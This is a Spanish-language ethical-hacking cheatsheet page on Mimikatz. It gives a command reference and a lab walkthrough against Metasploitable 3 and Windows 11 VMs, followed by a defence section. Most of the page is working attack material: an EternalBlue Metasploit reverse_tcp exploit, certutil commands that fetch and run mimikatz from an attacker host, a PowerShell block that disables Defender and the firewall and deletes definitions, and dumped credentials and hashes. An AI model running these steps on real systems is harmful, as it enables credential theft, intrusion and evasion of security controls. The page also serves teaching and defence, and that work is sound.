
# Mimikatz

#### Repositorio original (código fuente en C)

{% embed url="<https://github.com/gentilkiwi/mimikatz>" %}

#### Repositorio de Parrot (ejecutables en .exe y .dll)

{% embed url="<https://github.com/ParrotSec/mimikatz>" %}

<figure><img src="/files/kW7GoHxKdeZX6CMpTUNK" alt=""><figcaption></figcaption></figure>

{% hint style="danger" %}
**Nota:** Este tipo de técnicas son muy invasivas, ya que vamos a conseguir información sensible, por lo que no podemos utilizar estas técnicas sin un consentimiento o aprobación por parte del objetivo
{% endhint %}

## <mark style="color:purple;">Principales Comandos</mark>

Mimikatz tiene multitud de comandos para extraer información y credenciales, algunos de los principales son:

* `privilege::debug`: Este comando se utiliza para habilitar la depuración en el proceso actual, lo que permite a Mimikatz obtener acceso a las credenciales del sistema.
* `token::elevate`: Este comando se utiliza para obtener privilegios elevados en el sistema actual.
* `sekurlsa::logonPasswords`: Este comando se utiliza para recuperar las contraseñas almacenadas en el archivo LSASS.exe, que es el proceso responsable de la gestión de credenciales en sistemas Windows.
* `lsadump::sam`: Este comando se utiliza para recuperar las contraseñas almacenadas en el archivo SAM, que es la base de datos de cuentas locales en sistemas Windows.
* `lsadump::cache`: Este comando se utiliza para recuperar las credenciales almacenadas en la caché de credenciales del sistema.
* `lsadump::secrets`: Este comando se utiliza para recuperar las credenciales almacenadas en el archivo SYSTEM, que es un archivo que contiene información sobre la configuración del sistema.

Escribiendo solamente el comando principal seguido de 2 puntos como `privilege::`, `token::`, o `lsadump::` obtenemos las variables que le podemos pasar para extraer información:

```
mimikatz # lsadump::

Module :        lsadump
Full name :     LsaDump module

             sam  -  Get the SysKey to decrypt SAM entries (from registry or hives)
         secrets  -  Get the SysKey to decrypt SECRETS entries (from registry or hives)
           cache  -  Get the SysKey to decrypt NL$KM then MSCache(v2) (from registry or hives)
             lsa  -  Ask LSA Server to retrieve SAM/AD entries (normal, patch on the fly or inject)
           trust  -  Ask LSA Server to retrieve Trust Auth Information (normal or patch on the fly)
      backupkeys
          rpdata
          dcsync  -  Ask a DC to synchronize an object
        dcshadow  -  They told me I could be anything I wanted, so I became a domain controller
         setntlm  -  Ask a server to set a new password/ntlm for one user
      changentlm  -  Ask a server to set a new password/ntlm for one user
         netsync  -  Ask a DC to send current and previous NTLM hash of DC/SRV/WKS
        packages
             mbc
       zerologon
   postzerologonlsa
```

## <mark style="color:purple;">Cheatsheet</mark>

<table><thead><tr><th width="294">Comando</th><th>Descripción</th></tr></thead><tbody><tr><td><code>privilege::debug</code></td><td>Habilita los privilegios de depuración en el proceso actual.</td></tr><tr><td><code>token::elevate</code></td><td>Intenta elevar los privilegios del token del proceso actual al nivel de "System".</td></tr><tr><td><code>lsadump::lsa</code></td><td>Muestra información sobre la Política de Seguridad Local (LSA) del sistema.</td></tr><tr><td><code>lsadump::sam</code></td><td>Muestra las cuentas de usuario almacenadas en la base de datos SAM (Security Accounts Manager).</td></tr><tr><td><code>lsadump::secrets</code></td><td>Muestra los secretos almacenados en LSASS, como claves de máquina y otros datos sensibles.</td></tr><tr><td><code>lsadump::cache</code></td><td>Muestra las credenciales almacenadas en la caché de autenticación de Windows.</td></tr><tr><td><code>sekurlsa::logonpasswords</code></td><td>Muestra las contraseñas en texto plano almacenadas en LSASS (Local Security Authority Subsystem Service).</td></tr><tr><td><code>sekurlsa::tickets /export</code></td><td>Enumera los tickets de Kerberos en el sistema y los exporta a un archivo.</td></tr><tr><td><code>sekurlsa::pth /user:&#x3C;username> /domain:&#x3C;domain> /ntlm:&#x3C;ntlmhash></code></td><td>Realiza un Pass-the-Hash (PTH) con el hash NTLM proporcionado.</td></tr><tr><td><code>sekurlsa::pth /user:&#x3C;username> /domain:&#x3C;domain> /ntlm:&#x3C;ntlmhash> /run:&#x3C;command></code></td><td>Realiza un Pass-the-Hash (PTH) y ejecuta un comando utilizando las credenciales obtenidas.</td></tr><tr><td><code>sekurlsa::wdigest</code></td><td>Muestra las contraseñas almacenadas en LSASS en formato WDigest.</td></tr><tr><td><code>sekurlsa::ekeys</code></td><td>Muestra las claves de cifrado de Kerberos almacenadas en LSASS.</td></tr><tr><td><code>dpapi::masterkey</code></td><td>Muestra las claves maestras DPAPI (Data Protection API) almacenadas en el sistema.</td></tr><tr><td><code>dpapi::cred</code></td><td>Muestra las credenciales DPAPI protegidas almacenadas en el sistema.</td></tr><tr><td><code>dpapi::chrome</code></td><td>Muestra las credenciales guardadas por Google Chrome utilizando DPAPI.</td></tr><tr><td><code>dpapi::firefox</code></td><td>Muestra las credenciales guardadas por Mozilla Firefox utilizando DPAPI.</td></tr><tr><td><code>dpapi::credhist</code></td><td>Muestra el historial de credenciales de usuario protegidas por DPAPI.</td></tr><tr><td><code>crypto::capi</code></td><td>Enumera las claves y los certificados almacenados en el almacén de claves de Windows.</td></tr><tr><td><code>crypto::certificates /export</code></td><td>Exporta los certificados del almacén de certificados de Windows a archivos individuales.</td></tr><tr><td><code>crypto::keys /machine</code></td><td>Enumera las claves criptográficas de máquina almacenadas en el sistema.</td></tr><tr><td><code>crypto::keys /user</code></td><td>Enumera las claves criptográficas de usuario almacenadas en el sistema.</td></tr><tr><td><code>vault::list</code></td><td>Enumera los elementos almacenados en el Vault de Windows, como credenciales de Internet Explorer y Edge.</td></tr><tr><td><code>vault::cred /patch</code></td><td>Enumera las credenciales protegidas almacenadas en el Vault de Windows.</td></tr><tr><td><code>vault::cred /export</code></td><td>Exporta las credenciales protegidas almacenadas en el Vault de Windows a archivos individuales.</td></tr><tr><td><code>token::list /export</code></td><td>Enumera los tokens de seguridad en el sistema y los exporta a un archivo.</td></tr><tr><td><code>misc::cmd</code></td><td>Ejecuta comandos en un símbolo del sistema.</td></tr><tr><td><code>misc::memssp</code></td><td>Carga el módulo <code>MemSSP.dll</code> para interceptar credenciales en memoria.</td></tr><tr><td><code>misc::screenshot</code></td><td>Toma una captura de pantalla del escritorio del usuario actual.</td></tr><tr><td><code>misc::wifi</code></td><td>Enumera los perfiles de Wi-Fi almacenados en el sistema y muestra sus contraseñas.</td></tr></tbody></table>

***

## <mark style="color:purple;">Caso práctico</mark>

Vamos a poner a prueba Mimikatz contra la máquina `Metasploitable 3 Windows` o contra una máquina `Windows 11 Developer` para probar técnicas de evasión de antivirus:

{% content-ref url="/pages/oeb7yCOm8SMjwlcBGuRB" %}
[Metasploitable 3](/ethical-hacking-cheatsheet/introduccion/ethical-hacking-cheatsheet/instalacion-del-entorno/maquinas-vulnerables/metasploitable-3.md)
{% endcontent-ref %}

{% content-ref url="/pages/Je9uNudbLqx0yR746obF" %}
[Windows 11 Developer](/ethical-hacking-cheatsheet/introduccion/ethical-hacking-cheatsheet/instalacion-del-entorno/maquinas-vulnerables/windows-11-developer.md)
{% endcontent-ref %}

{% hint style="success" %}
**Nota**: Necesitamos tener tanto las máquinas como Kali Linux en modo `Bridge` para que sean accesibles en nuestra red local.
{% endhint %}

#### Test de conexión

Si no puedes hacer ping desde tu Kali Linux hacia la máquina Windows 11 Developer, probablemente se debe a la **configuración del firewall** de Windows, que **bloquea ICMP (ping) por defecto**, incluso en modo desarrollador. Podemos deshabilitarlo con el siguiente comando en una Powershell cómo administrador:

```powershell
New-NetFirewallRule -DisplayName "Allow ICMPv4-In" -Protocol ICMPv4 -Direction Inbound -Action Allow
```

***

## <mark style="color:purple;">Ejecución de Mimikatz</mark>

Podemos conseguir ejecutar Mimikatz en un objetivo de varias formas, por lo que cubriremos las más habituales.

## Opción 1: Envío manual del binario

El repositorio oficial contiene el código fuente en C, pero el de ParrotSec contiene ejecutables en .exe y .dll precompilados que podemos utilizar libremente:

{% embed url="<https://github.com/ParrotSec/mimikatz>" %}

```sh
# En Kali
python3 -m http.server 80

# En Windows
wget http://IP-KALI/mimikatz.exe -o mimikatz.exe
```

{% hint style="warning" %}
**Nota**: En sistemas Windows modernos no podremos enviarnos Mimikatz a través de este método ya que lo bloqueará el Defender, por lo que debemos deshabilitarlo desde Powershell.
{% endhint %}

<figure><img src="/files/TXnQ4LUBweefmQ7Zw3Aj" alt=""><figcaption></figcaption></figure>

### Deshabilitar Defender

Ejecutar los siguientes comandos en una Powershell como administrador:

{% hint style="success" %}
**Tip**: Puedes copiar todo el contenido y pegarlo en la PowerShell para evitar ir uno por uno
{% endhint %}

```powershell
# Deshabilitar protección en tiempo real
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableBlockAtFirstSeen $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableScriptScanning $true
Set-MpPreference -DisableIntrusionPreventionSystem $true
Set-MpPreference -DisablePrivacyMode $true

# Deshabilitar el firewall
Set-NetFirewallProfile -Profile Domain -Enabled False
Set-NetFirewallProfile -Profile Private -Enabled False
Set-NetFirewallProfile -Profile Public -Enabled False

# Detener Windows Defender
sc stop WinDefend

# Comando para eliminar definiciones de virus
& "$env:ProgramFiles\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```

Una vez deshabilitado ya lo podemos enviar sin problema:

<figure><img src="/files/LYvdwQOzXjTHmfwxU7D3" alt=""><figcaption></figcaption></figure>

### Ejecutar Mimikatz y guardar log

{% hint style="info" %}
**Nota**: Mimikatz puede generar una salida por terminal enorme en función del entorno, por lo que se recomienda siempre guardar la salida en un log para facilitar el análisis posterior.
{% endhint %}

```
C:\Tools\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # log
Using 'mimikatz.log' for logfile : OK
```

## Opción 2: Acceso desde Meterpreter

Probaremos esta técnica contra la máquina Metasploitable 3 Windows.

{% content-ref url="/pages/oeb7yCOm8SMjwlcBGuRB" %}
[Metasploitable 3](/ethical-hacking-cheatsheet/introduccion/ethical-hacking-cheatsheet/instalacion-del-entorno/maquinas-vulnerables/metasploitable-3.md)
{% endcontent-ref %}

### Explotación: EternalBlue

```bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOST <IP de Metasploitable3>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <IP de Kali>
run
```

### Cargar el módulo de Mimikatz

```bash
meterpreter > load kiwi
```

```bash
meterpreter > help kiwi

Kiwi Commands
=============

    Command                Description
    -------                -----------
    creds_all              Retrieve all credentials (parsed)
    creds_kerberos         Retrieve Kerberos creds (parsed)
    creds_livessp          Retrieve Live SSP creds
    creds_msv              Retrieve LM/NTLM creds (parsed)
    creds_ssp              Retrieve SSP creds
    creds_tspkg            Retrieve TsPkg creds (parsed)
    creds_wdigest          Retrieve WDigest creds (parsed)
    dcsync                 Retrieve user account information via DCSync (unparsed)
    dcsync_ntlm            Retrieve user account NTLM hash, SID and RID via DCSync
    golden_ticket_create   Create a golden kerberos ticket
    kerberos_ticket_list   List all kerberos tickets (unparsed)
    kerberos_ticket_purge  Purge any in-use kerberos tickets
    kerberos_ticket_use    Use a kerberos ticket
    kiwi_cmd               Execute an arbitrary mimikatz command (unparsed)
    lsa_dump_sam           Dump LSA SAM (unparsed)
    lsa_dump_secrets       Dump LSA secrets (unparsed)
    password_change        Change the password/hash of a user
    wifi_list              List wifi profiles/creds for the current user
    wifi_list_shared       List shared wifi profiles/creds (requires SYSTEM)
```

### Privilege Debug y Token Elevate

#### **`privilege::debug`**

Este privilegio permite a un proceso acceder a la memoria de otro proceso. Es especialmente útil en el análisis y depuración de programas, así como en la recolección de credenciales y otros datos sensibles de la memoria.

```bash
mimikatz # privilege::debug
ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061
```

**`token::elevate`**

Este comando se utiliza para elevar el contexto de seguridad de un proceso a un nivel más alto, generalmente el de SYSTEM, para obtener permisos más amplios dentro del sistema operativo. Esto permite realizar acciones que normalmente requerirían permisos administrativos avanzados.

```bash
mimikatz # token::elevate
Token Id  : 0
User name : 
SID name  : NT AUTHORITY\SYSTEM

232	{0;000003e7} 0 D 24526     	NT AUTHORITY\SYSTEM	S-1-5-18	(04g,30p)	Primary
 -> Impersonated !
 * Process Token : {0;000003e7} 0 D 1277014   	NT AUTHORITY\SYSTEM	S-1-5-18	(11g,05p)	Primary
 * Thread Token  : {0;000003e7} 0 D 1313164   	NT AUTHORITY\SYSTEM	S-1-5-18	(04g,30p)	Impersonation (Delegation)
```

### Obtener credenciales

#### A través de kiwi

```bash
meterpreter > creds_all

[+] Running as SYSTEM
[*] Retrieving all credentials
msv credentials
===============

Username       Domain          NTLM                              SHA1
--------       ------          ----                              ----
Administrator  VAGRANT-2008R2  e02bc503339d51f71d913c245d35b50b  c805f88436bcd9ff534ee86c59ed230437505ecf
sshd_server    VAGRANT-2008R2  8d0a16cfc061c3359db455d00ec27035  94bd2df8ae5cadbbb5757c3be01dd40c27f9362f

wdigest credentials
===================

Username         Domain          Password
--------         ------          --------
(null)           (null)          (null)
Administrator    VAGRANT-2008R2  vagrant
VAGRANT-2008R2$  WORKGROUP       (null)
sshd_server      VAGRANT-2008R2  D@rj33l1ng

kerberos credentials
====================

Username         Domain          Password
--------         ------          --------
(null)           (null)          (null)
Administrator    VAGRANT-2008R2  (null)
sshd_server      VAGRANT-2008R2  (null)
vagrant-2008r2$  WORKGROUP       (null)
```

#### De forma clásica (con comandos de mimikatz)

```bash
meterpreter > kiwi_cmd -f sekurlsa::logonpasswords

mimikatz(powershell) # sekurlsa::logonpasswords

Authentication Id : 0 ; 896324 (00000000:000dad44)
Session           : Interactive from 1
User Name         : Administrator
Domain            : VAGRANT-2008R2
Logon Server      : VAGRANT-2008R2
Logon Time        : 5/29/2025 11:18:41 AM
SID               : S-1-5-21-2010520603-3385233033-3932565385-500
	msv :	
	[00010000] CredentialKeys
	* NTLM     : e02bc503339d51f71d913c245d35b50b
	* SHA1     : c805f88436bcd9ff534ee86c59ed230437505ecf
	[00000003] Primary
	* Username : Administrator
	* Domain   : VAGRANT-2008R2
	* NTLM     : e02bc503339d51f71d913c245d35b50b
	* SHA1     : c805f88436bcd9ff534ee86c59ed230437505ecf
	tspkg :	
	wdigest :	
	* Username : Administrator
	* Domain   : VAGRANT-2008R2
	* Password : vagrant
	kerberos :	
	* Username : Administrator
	* Domain   : VAGRANT-2008R2
	* Password : (null)
	
<----SNIP---->
```

## **Opción 3: Subida manual desde Meterpreter**

### Subir mimikatz

```bash
meterpreter > pwd
C:\Windows\system32

meterpreter > cd c:/Users/Administrator/Desktop
meterpreter > pwd
c:\Users\Administrator\Desktop

meterpreter > upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe

[*] Uploading  : /usr/share/windows-resources/mimikatz/x64/mimikatz.exe -> mimikatz.exe
[*] Uploaded 1.29 MiB of 1.29 MiB (100.0%): /usr/share/windows-resources/mimikatz/x64/mimikatz.exe -> mimikatz.exe
[*] Completed  : /usr/share/windows-resources/mimikatz/x64/mimikatz.exe -> mimikatz.exe
```

### Ejecutar desde shell

```shell-session
meterpreter > shell

mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # 
```

## Opción 4: Mimikatz Fileless (bypass AV)

Ejecutar **Mimikatz de forma fileless** (sin escribir archivos en disco) significa **cargar y ejecutar Mimikatz directamente en la memoria RAM** de un sistema sin dejar un binario físico (como `mimikatz.exe`) en el disco duro. Esta técnica es usada comúnmente por atacantes avanzados (y red teamers) para **evadir antivirus, EDR y otras soluciones basadas en detección de archivos o hashes**.

Probaremos esta técnica contra la máquina Windows 11 Developer.

{% content-ref url="/pages/Je9uNudbLqx0yR746obF" %}
[Windows 11 Developer](/ethical-hacking-cheatsheet/introduccion/ethical-hacking-cheatsheet/instalacion-del-entorno/maquinas-vulnerables/windows-11-developer.md)
{% endcontent-ref %}

{% code title="En Kali" %}

```bash
cd /usr/share/windows-resources/mimikatz/x64

python3 -m http.server 80
```

{% endcode %}

{% code title="En Powershell" %}

```powershell
certutil -urlcache -split -f http://192.168.1.167/mimikatz.exe $env:TEMP\m.exe
& "$env:TEMP\m.exe" "privilege::debug" "token::elevate" "lsadump::sam" "sekurlsa::logonpasswords"
```

{% endcode %}

Incluso siendo una técnica fileless (sin archivos en disco) Defender bloquea su ejecución, por lo que lo deshabilitaremos para probar la técnica. En entornos más antiguos esta técnica haría el bypass sin problema.

<figure><img src="/files/kXOmyafRe3AyBmIBNQ18" alt=""><figcaption></figcaption></figure>

### Deshabilitar Defender con Powershell

```powershell
# Deshabilitar protección en tiempo real
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableBlockAtFirstSeen $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableScriptScanning $true
Set-MpPreference -DisableIntrusionPreventionSystem $true
Set-MpPreference -DisablePrivacyMode $true

# Deshabilitar el firewall
Set-NetFirewallProfile -Profile Domain -Enabled False
Set-NetFirewallProfile -Profile Private -Enabled False
Set-NetFirewallProfile -Profile Public -Enabled False

# Detener Windows Defender
sc stop WinDefend

# Comando para eliminar definiciones de virus
& "$env:ProgramFiles\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```

### Verificar que esta deshabilitado

Podemos ejecutar el siguiente script en Powershell para hacer una verificación completa del estado de seguridad y los elementos que han sido deshabilitados.

{% hint style="success" %}
**Tip**: Puedes copiar y pegar directamente el siguiente script en Powershell para ejecutarlo directamente
{% endhint %}

```powershell
# Script de verificación mejorado con formato visual (compatible con todas versiones de PS)
Write-Host "`n=== ESTADO DE SEGURIDAD DE WINDOWS ===" -ForegroundColor Cyan

# Verificación de Defender
$defender = Get-MpComputerStatus
Write-Host "`n[DEFENDER]" -ForegroundColor Yellow

if ($defender.RealTimeProtectionEnabled -eq $false) {
    Write-Host "Protección tiempo real: DESACTIVADA" -ForegroundColor Green
} else {
    Write-Host "Protección tiempo real: ACTIVA" -ForegroundColor Red
}

if ($defender.BehaviorMonitorEnabled -eq $false) {
    Write-Host "Monitor comportamiento: DESACTIVADO" -ForegroundColor Green
} else {
    Write-Host "Monitor comportamiento: ACTIVO" -ForegroundColor Red
}

if ($defender.IOAVProtectionEnabled -eq $false) {
    Write-Host "Protección IOAV: DESACTIVADA" -ForegroundColor Green
} else {
    Write-Host "Protección IOAV: ACTIVA" -ForegroundColor Red
}

if ($defender.ScriptScanningEnabled -eq $false) {
    Write-Host "Escaneo scripts: DESACTIVADO" -ForegroundColor Green
} else {
    Write-Host "Escaneo scripts: ACTIVO" -ForegroundColor Red
}

# Estado del Firewall
Write-Host "`n[FIREWALL]" -ForegroundColor Yellow
Get-NetFirewallProfile | ForEach-Object {
    if ($_.Enabled) {
        Write-Host ("Perfil {0,-7}: ACTIVO" -f $_.Name) -ForegroundColor Red
    } else {
        Write-Host ("Perfil {0,-7}: DESACTIVADO" -f $_.Name) -ForegroundColor Green
    }
}

# Servicio Defender
$service = Get-Service WinDefend
Write-Host "`n[SERVICIO DEFENDER]" -ForegroundColor Yellow
if ($service.Status -eq "Stopped") {
    Write-Host "Estado: DETENIDO" -ForegroundColor Green
} else {
    Write-Host "Estado: EN EJECUCIÓN" -ForegroundColor Red
}
Write-Host ("Inicio: " + $service.StartType)

# Tamper Protection
try {
    $tamper = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features" -Name "TamperProtection").TamperProtection
    Write-Host "`n[TAMPER PROTECTION]" -ForegroundColor Yellow
    if ($tamper -eq 0) {
        Write-Host "Estado: DESACTIVADO" -ForegroundColor Green
    } else {
        Write-Host "Estado: ACTIVO" -ForegroundColor Red
    }
} catch {
    Write-Host "`nTamper Protection: No disponible" -ForegroundColor Gray
}

# Definiciones
try {
    $defs = & "$env:ProgramFiles\Windows Defender\MpCmdRun.exe" -GetFiles 2>&1
    Write-Host "`n[DEFINICIONES DE VIRUS]" -ForegroundColor Yellow
    if ($defs -match "Signature Version") {
        Write-Host "Definiciones PRESENTES" -ForegroundColor Red
    } else {
        Write-Host "Definiciones ELIMINADAS" -ForegroundColor Green
    }
} catch {
    Write-Host "Error al verificar definiciones" -ForegroundColor Red
}

Write-Host "`n=== FIN DEL REPORTE ===" -ForegroundColor Cyan
```

<figure><img src="/files/CqfvWWt4PZyx0kZBvISo" alt=""><figcaption></figcaption></figure>

### Ejecucion fileless en Powershell

{% code overflow="wrap" %}

```powershell
certutil -urlcache -split -f http://192.168.1.156/mimikatz.exe $env:TEMP\m.exe
& "$env:TEMP\m.exe" "privilege::debug" "token::elevate" "lsadump::sam" "sekurlsa::logonpasswords"

****  En línea  ****

http://192.168.1.156/mimikatz.exe

Entradas de caché WinINet: 1

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # sekurlsa::logonpasswords

Authentication Id : 0 ; 307312 (00000000:0004b070)
Session           : Interactive from 1
User Name         : afern
Domain            : DESKTOP-ECKQUF3
Logon Server      : (null)
Logon Time        : 5/29/2025 12:48:17 PM
SID               : S-1-5-21-4226096133-763015793-1092848644-1001
        msv :
         [00000003] Primary
         * Username : user@hotmail.com
         * Domain   : MicrosoftAccount
         * NTLM     : 446488e237900324b839a54gfhtie785
<----SNIP---->
```

{% endcode %}

***

## <mark style="color:purple;">**Defensa, detección y contramedidas**</mark>

### **1. Activar Credential Guard (Windows 10/11 Enterprise)**

> 🔒 *Protección a nivel de virtualización para evitar que Mimikatz acceda a LSASS.*

* **Evita extracción de credenciales almacenadas en memoria.**
* Compatible con sistemas modernos.
* Ideal para endpoints de alto riesgo o administradores.

```powershell
Enable-WindowsOptionalFeature -Online -FeatureName Windows-Defender-Credential-Guard
```

### **2. Ejecutar LSASS como proceso protegido (RunAsPPL)**

> 🧱 *Impide que procesos no confiables accedan a la memoria de LSASS, incluso con privilegios altos.*

```powershell
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL /t REG_DWORD /d 1 /f
```

* Requiere reinicio.
* Compatible con AV/EDR que no interfieran con LSASS.

### **3. Desactivar WDigest**

> 🚫 *Evita que las credenciales en texto claro se almacenen en memoria.*

```powershell
reg add "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" /v UseLogonCredential /t REG_DWORD /d 0 /f
```

* Mitiga uno de los vectores más usados por Mimikatz.
* Efectivo en entornos heredados donde aún se usa WDigest por compatibilidad.

### **4. Monitorización de acceso a LSASS con Sysmon**

> 👁️ *Detecta intentos de acceso ilegítimos al proceso LSASS.*

* **Sysmon + SIEM** (Splunk, ELK, Wazuh) con reglas como:
  * `Event ID 10` (ProcessAccess)
  * `TargetImage = lsass.exe`
* Permite detección temprana y generación de alertas.

### **5. LAPS (Local Administrator Password Solution)**

> 🔐 *Evita la reutilización de credenciales locales (Pass-the-Hash).*

* Asigna contraseñas únicas, rotativas y cifradas a cada equipo.
* Se integra con GPO.
* Invalida ataques horizontales post-explotación.
